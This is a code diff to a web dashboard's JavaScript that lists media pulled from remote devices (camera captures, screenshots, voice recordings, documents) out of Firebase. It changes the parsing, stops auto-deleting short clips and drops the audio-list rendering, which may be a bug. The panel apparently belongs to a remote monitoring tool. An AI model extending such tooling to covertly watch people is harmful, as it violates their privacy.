@@ -3162,8 +3162,31 @@
       }
       lastMediaKeys = keys;
 
-      let arr = Object.entries(media).map(([key, val]) => ({ ...val, fbKey: key }))
-        .filter(m => {
+      let arr = [];
+      if (Array.isArray(media)) {
+        arr = media;
+      } else if (typeof media === 'object' && media !== null) {
+        Object.entries(media).forEach(([key, val]) => {
+          if (!val) return;
+          if (Array.isArray(val)) {
+            val.forEach((item, idx) => {
+              const fn = typeof item === 'string' ? item : (item.name || `file_${idx}`);
+              const mType = (key === 'voice' || fn.toLowerCase().startsWith('audio_')) ? 'audio' : (key === 'photos' ? 'image' : 'file');
+              arr.push({
+                fbKey: `${key}_${idx}`,
+                name: fn,
+                url: `/api/media/stream/${currentID}/${fn}`,
+                type: mType,
+                time: Date.now()
+              });
+            });
+          } else if (typeof val === 'object') {
+            arr.push({ ...val, fbKey: key });
+          }
+        });
+      }
+
+      arr = arr.filter(m => {
           if (!m) return false;
           const dVal = String(m.duration || "");
           const dNum = parseFloat(dVal);
@@ -3177,8 +3200,6 @@
             name.includes("1min") || name.includes("1_min");
 
           if (isBad && currentID) {
-            // PERMANENT DELETE from Firebase instantly
-            db.ref(`devices/${currentID}/media/${m.fbKey}`).remove();
             return false;
           }
           return true;
@@ -3291,7 +3312,6 @@
 
       if (cg) cg.innerHTML = camH || '<div style="padding:40px;color:var(--text3);text-align:center">No camera captures</div>';
       if (sg) sg.innerHTML = ssH || '<div style="padding:40px;color:var(--text3);text-align:center">No screenshots</div>';
-      if (al) al.innerHTML = auH || '<div class="empty-state"><div class="empty-state-visual"><div class="visual-wave-bar"></div></div><div class="empty-state-text">No recordings available</div></div>';
 
       // Documents - Unlimited
       const docH = arr.filter(m => m.type === "file")
@@ -3306,9 +3326,6 @@
         </td>
     </tr>`).join("");
 
-      if (cg) cg.innerHTML = camH || '<div style="padding:40px;color:var(--text3);text-align:center">No camera captures</div>';
-      if (sg) sg.innerHTML = ssH || '<div style="padding:40px;color:var(--text3);text-align:center">No screenshots</div>';
-      if (al) al.innerHTML = auH || '<div style="padding:40px;color:var(--text3);text-align:center">No recordings</div>';
       if (dl) dl.innerHTML = docH || '<tr><td colspan="3" class="empty-row">No documents</td></tr>';
 
       processLazyImages();
